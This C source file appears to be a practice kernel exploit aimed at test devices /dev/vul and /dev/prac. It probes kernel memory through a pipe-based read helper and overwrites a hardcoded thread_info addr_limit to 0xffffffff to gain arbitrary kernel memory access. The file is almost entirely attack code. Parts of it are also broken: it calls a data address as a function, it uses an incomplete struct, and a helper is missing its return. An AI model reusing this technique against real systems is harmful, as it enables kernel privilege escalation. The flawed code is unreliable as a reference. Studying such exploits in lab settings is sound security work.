#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>


#define DEVICE_FILE "/dev/vul"
#define THREAD_INFO 0xf9318000




struct thread_info* (*fake_info)();

ssize_t read_pipe(void *dest, void *src, size_t count) {
    int pipefd[2];
    ssize_t len;

    pipe(pipefd);
    len = write(pipefd[1], src, count);
    if(len != count) {
        printf("failed read_pipe (write) @ %p: %d %d\n",src, (int)len, errno);
        return len;
    }
    len = read(pipefd[0],dest,count);
    if(len != count) {
        printf("failed read_pipe (read) @ %p: %d %d\n",src, (int)len, errno);
        return len;
    }

    close(pipefd[0]);
    close(pipefd[1]);
}
void scan() {
    unsigned long* pt = (unsigned long*)0xc0008000;
    size_t i;
    int rc;
    for(i = 0; i < 5; i+=1) {
        unsigned long buf;
        rc = read_pipe(&buf,pt+i,sizeof(unsigned int));
        if(rc) printf("failed to read from %p\n",pt+i);
        printf("%p: %x\n",pt+i,buf);
    }
}

unsigned int buffer[0x3000];
int main(int argc, char* argv[]) {
  int i,j;
    ssize_t rc;
    //printf("scan before:\n");
    //scan();
 
int fd = open(DEVICE_FILE, O_RDWR);

    if (fd < 0) {
        printf("failed to open (1st) %s: %s(%d)\n",DEVICE_FILE,strerror(errno),errno);
        return 1;
    }

int fd2 = open("/dev/prac", O_RDWR, 0600);
 if (fd2 < 0) {
        printf("failed to open (1st) %s: %s(%d)\n",DEVICE_FILE,strerror(errno),errno);
        return 1;
    }
    int cnt;
	printf("READ DATA\n");
	memcpy (buffer, "hahaha", 6);
	fake_info = (void **) THREAD_INFO;
	fake_info()->addr_limit.seg = 0xffffffff;
	//printf("READ DATA: %s, %d\n", buffer, cnt);
	//cnt = write(fd, buffer, 10);
	//printf("WRITE DATA: %s, %d\n", buffer, cnt);
	unsigned int buf[10];

	//cnt = read(fd, buf, 4);
	//printf("READ DATA: %s, %d\n", buf, cnt);

    //printf("scan after:\n");
    //scan();
close(fd2);
    close(fd);
    return 0;
}
